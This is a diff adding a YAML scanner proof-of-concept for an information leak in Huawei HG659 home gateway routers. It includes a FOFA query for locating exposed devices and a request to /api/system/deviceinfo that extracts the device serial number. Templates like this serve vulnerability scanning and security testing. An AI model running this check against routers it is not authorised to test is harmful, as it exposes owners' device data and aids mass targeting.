@@ -1,0 +1,18 @@
+id: poc-yaml-huawei-router-deviceinfo-info-leak
+info:
+  name: 华为路由器 deviceinfo 敏感信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 华为路由器
+  fofa: app="HUAWEI-Home-Gateway-HG659"
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && contains(title,"HUAWEI Home Gateway")
+- method: GET
+  path: /api/system/deviceinfo
+  expression: status_code == 200 && matches(body,"\"SerialNumber\":\"([0-9A-Z]+)\"")
+    && !contains(body,"<") && contains(content_type,"application/javascript")
+variables: {}
+transport: http
